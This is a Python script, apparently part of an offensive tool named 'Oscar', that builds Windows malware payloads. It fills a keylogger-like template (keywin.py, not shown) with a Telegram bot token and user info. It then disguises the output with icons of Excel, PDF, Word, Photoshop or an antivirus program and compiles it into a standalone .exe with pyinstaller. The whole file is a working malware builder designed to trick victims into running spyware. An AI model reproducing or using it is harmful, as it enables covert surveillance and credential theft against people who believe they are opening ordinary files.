#!/usr/local/bin/python3

import subprocess
import platform,os
from modules import banner
from colorama import *
import time

def win_payload():

    time.sleep(0.2)

    banner.Oscar_Banner()

    try:


        print(Back.BLACK+Fore.RED+ " Please Enter Payloads Name > For example : Ocar\n"+Style.RESET_ALL)

        get_payload_name = input(Fore.LIGHTWHITE_EX+" Oscar"+Fore.RED+" (Get Name Payloads)" +Fore.LIGHTWHITE_EX+" > ")

        time.sleep(0.2)

        banner.Oscar_Banner()

        print(Back.BLACK+Fore.RED+ " Please Enter Bot Token Telegram \n"+Style.RESET_ALL)

        get_bot_token = input(Fore.LIGHTWHITE_EX+" Oscar"+Fore.RED+" (Get Bot Token)" +Fore.LIGHTWHITE_EX+" > ")
        
        time.sleep(0.2)

        banner.Oscar_Banner()
        
        print(Back.BLACK+Fore.RED+ " Please Enter User Info \n"+Style.RESET_ALL)

        get_user_info = input(Fore.LIGHTWHITE_EX+" Oscar"+Fore.RED+" (Get User Info)" +Fore.LIGHTWHITE_EX+" > ")



        payload_data = open("modules/keywin.py","r").read().replace("TOKEN",f"'{get_bot_token}'").replace("USERINFO",f"'{get_user_info}'")

        new_file = open(f"Payload-win/{get_payload_name}.py","w")
        new_file.write(payload_data)
        new_file.close()

        time.sleep(0.1)

        banner.Oscar_Banner()

        print(Fore.WHITE+" Place Enter The Icon Name \n")
        print(Fore.GREEN+"""
[1] excel
[2] pdf
[3] Vlc
[4] powerpoint
[5] word
[6] Counter Strike 
[7] Adobe After Effects 
[8] Adobe Photoshop 
[9] Anti Virus
        """)
        icon_number = input(Fore.LIGHTWHITE_EX+" Oscar"+Fore.RED+" (Get User Info)" +Fore.LIGHTWHITE_EX+" > ")
        icon_name = ()
        if icon_number == "1":
            icon_name = ("excel.ico")
        elif icon_number == "2":
            icon_name = ("pdf.ico")
        elif icon_number == "3":
            icon_name = ("vlc.ico")
        elif icon_number == "4":
            icon_name = ("powerpoint.ico")
        elif icon_number == "5":
            icon_name = ("word.ico")
        elif icon_number == "6":
            icon_name = ("Counter-Strike.ico")
        elif icon_number == "7":
            icon_name = ("Adobe-After-Effects.ico")
        elif icon_number == "8":
            icon_name = ("Adobe-Photoshop.ico")
        elif icon_number == "9":
            icon_name = ("Anti-Virus.ico")
        elif icon_number != "1" or "2" or "3" or "4" or "5" or "6" or "7" or "8" or "9":
            print(Fore.LIGHTCYAN_EX+" Please select one of the desired options"+Style.RESET_ALL)
            input(Fore.LIGHTMAGENTA_EX+ "\n Back To The Menu ( Press Enter ... ) ")
        else:
            icon_name = icon_number
        
        with open("log.log", 'w') as pylog:    
            subprocess.Popen(("pyinstaller --onefile Payload-win/"+get_payload_name+".py"+" -i icon/"+icon_name), stdout=pylog, stderr=pylog)
            
            time.sleep(3)

            banner.Oscar_Banner()

            print(Fore.LIGHTYELLOW_EX+" Please Wait ...")
            print(Fore.LIGHTCYAN_EX+"\n The compilation process may take up to 1 minute ")

            time.sleep(40)

            print(Fore.LIGHTMAGENTA_EX+"\n Your Payload Generated In The /Oscar/dist/"+get_payload_name+".exe")  
            input(Fore.CYAN+ "\n Back To The Menu ( Press Enter ... ) ")
    
    except Exception as ex:
        print(ex)
        input()
